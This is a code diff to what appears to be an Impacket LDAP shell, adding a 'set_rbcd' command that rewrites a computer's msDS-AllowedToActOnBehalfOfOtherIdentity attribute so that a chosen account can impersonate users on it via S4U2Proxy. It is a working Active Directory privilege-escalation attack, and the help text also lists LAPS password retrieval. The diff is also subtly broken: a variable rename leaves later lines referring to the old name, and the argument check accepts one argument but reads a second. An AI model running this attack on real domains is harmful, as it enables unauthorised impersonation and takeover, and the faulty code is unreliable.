@@ -1,4 +1,5 @@
 # SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
+
 #
 # This software is provided under under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -64,6 +65,24 @@ class LdapShell(cmd.Cmd):
             LOG.debug('Exception info', exc_info=True)
 
         return ret_val
+
+    def create_empty_sd(self):
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+        sd['Revision'] = b'\x01'
+        sd['Sbz1'] = b'\x00'
+        sd['Control'] = 32772
+        sd['OwnerSid'] = ldaptypes.LDAP_SID()
+        # BUILTIN\Administrators
+        sd['OwnerSid'].fromCanonical('S-1-5-32-544')
+        sd['GroupSid'] = b''
+        sd['Sacl'] = b''
+        acl = ldaptypes.ACL()
+        acl['AclRevision'] = 4
+        acl['Sbz1'] = 0
+        acl['Sbz2'] = 0
+        acl.aces = []
+        sd['Dacl'] = acl
+        return sd
 
     def create_allow_ace(self, sid):
         nace = ldaptypes.ACE()
@@ -214,7 +233,7 @@ class LdapShell(cmd.Cmd):
             raise Exception("User not found in LDAP: %s" % user_name)
 
         entry = self.client.entries[0]
-        userAccountControl = entry["userAccountControl"].value
+        useraccountcontrol = entry["useraccountcontrol"].value
 
         print("Original userAccountControl: %d" % userAccountControl) 
 
@@ -225,6 +244,7 @@ class LdapShell(cmd.Cmd):
 
         print("Updated userAccountControl: %d" % userAccountControl) 
         self.client.modify(user_dn, {'userAccountControl':(ldap3.MODIFY_REPLACE, [userAccountControl])})
+        # TODO: Check if client.modify succeeded
 
     def do_search(self, line):
         arguments = shlex.split(line)
@@ -277,6 +297,7 @@ class LdapShell(cmd.Cmd):
 
         print("Updated userAccountControl: %d" % userAccountControl) 
         self.client.modify(user_dn, {'userAccountControl':(ldap3.MODIFY_REPLACE, [userAccountControl])})
+        # TODO: Check if client.modify succeeded according to client
 
     def do_get_user_groups(self, user_name):
         user_dn = self.get_dn(user_name)
@@ -291,6 +312,59 @@ class LdapShell(cmd.Cmd):
             raise Exception("Group not found in LDAP: %s" % group_name)
 
         self.search('(memberof:%s:=%s)' % (LdapShell.LDAP_MATCHING_RULE_IN_CHAIN, escape_filter_chars(group_dn)), "sAMAccountName", "name")
+
+    def do_set_rbcd(self, line):
+        args = shlex.split(line)
+
+        if len(args) != 1 and len(args) != 2:
+            raise Exception("Error expecting target and grantee sids for RBCD attack. Recieved %d arguments instead." % len(args))
+
+        target_name = args[0]
+        grantee_name = args[1]
+
+        target_sid = args[0]
+        grantee_sid = args[1]
+
+        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(target_name), attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+        if success is False or len(self.client.entries) != 1:
+            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
+
+        target = self.client.entries[0]
+        target_sid = target["objectSid"].value
+        print("Found Target DN: %s" % target.entry_dn)
+        print("Target SID: %s\n" % target_sid)
+
+        success = self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(grantee_name), attributes=['objectSid'])
+        if success is False or len(self.client.entries) != 1:
+            raise Exception("Error expected only one search result got %d results", len(self.client.entries))
+
+        grantee = self.client.entries[0]
+        grantee_sid = grantee["objectSid"].value
+        print("Found Grantee DN: %s" % grantee.entry_dn)
+        print("Grantee SID: %s" % grantee_sid)
+
+        try:
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0])
+            print('Currently allowed sids:')
+            for ace in sd['Dacl'].aces:
+                print('    %s' % ace['Ace']['Sid'].formatCanonical())
+        except IndexError:
+            sd = self.create_empty_sd()
+
+        sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
+        self.client.modify(target.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
+        if self.client.result['result'] == 0:
+            print('Delegation rights modified succesfully!')
+            print('%s can now impersonate users on %s via S4U2Proxy' % (grantee_name, target_name))
+        else:
+            if self.client.result['result'] == 50:
+                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
+            elif self.client.result['result'] == 19:
+                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
+            else:
+                raise Exception('The server returned an error: %s', self.client.result['message'])
+
+        return
 
     def search(self, query, *attributes):
         self.client.search(self.domain_dumper.root, query, attributes=attributes)
@@ -330,6 +404,7 @@ class LdapShell(cmd.Cmd):
  set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
  get_user_groups user - Retrieves all groups this user is a member of.
  get_group_users group - Retrieves all members of a group.
+ get_laps_password [computer] - TODO: Retrieves the LAPS passwords associated with a given computer or all of them.
  grant_control target grantee - Grant full control of a given target object (sid) to the grantee (sid). - TODO
  set_rbcd target grantee - Grant the grantee (sid) the ability to perform RBCD to the target (sid). - TODO
  write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
